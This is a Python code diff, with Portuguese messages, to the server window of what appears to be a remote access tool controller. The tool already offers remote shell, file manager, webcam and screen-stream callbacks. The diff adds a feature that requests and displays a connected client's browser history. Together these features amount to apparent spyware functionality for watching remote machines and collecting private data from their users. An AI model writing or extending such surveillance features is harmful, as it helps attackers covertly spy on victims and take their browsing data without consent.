@@ -45,7 +45,8 @@ class ServerMainWindow:
             self.request_shell,
             self.request_file_manager,
             self.request_webcam,
-            self.request_screen_stream   # Adicionar o callback de stream de tela
+            self.request_screen_stream,
+            self.request_browser_history   # Adicionar o novo callback
         )
         self.log_panel = LogPanel(content_frame)
         self._create_status_bar()
@@ -299,3 +300,27 @@ class ServerMainWindow:
             messagebox.showerror("Erro", f"Falha ao abrir visualização de stream de tela: {str(e)}")
     def process_screen_stream_frame(self, client_address, data):
         self.window_manager.process_screen_stream_frame(client_address, data)
+    def request_browser_history(self):
+        client_address = self.get_selected_client_address()
+        if not client_address:
+            return
+        try:
+            client_key = f"{client_address[0]}:{client_address[1]}"
+            if client_key in self.window_manager.closing_windows:
+                self.log_panel.add_log(f"Removendo {client_key} da lista de fechamento para permitir visualização de histórico")
+                self.window_manager.closing_windows.discard(client_key)
+            self.status_var.set(f"Solicitando histórico de navegação de {client_key}...")
+            self.log_panel.add_log(f"Solicitando histórico de navegação de {client_key}")
+            history_window = self.server.open_browser_history(client_address)
+            if not history_window:
+                raise Exception("Não foi possível abrir a janela de histórico")
+            def restore_status():
+                if self.server.is_running:
+                    host, port = self.server.server_socket.getsockname()
+                    self.status_var.set(f"Servidor rodando em {host}:{port}")
+                else:
+                    self.status_var.set("Servidor não iniciado")
+            self.root.after(3000, restore_status)
+        except Exception as e:
+            self.log_panel.add_log(f"Erro ao solicitar histórico de navegação: {str(e)}")
+            messagebox.showerror("Erro", f"Falha ao solicitar histórico de navegação: {str(e)}")
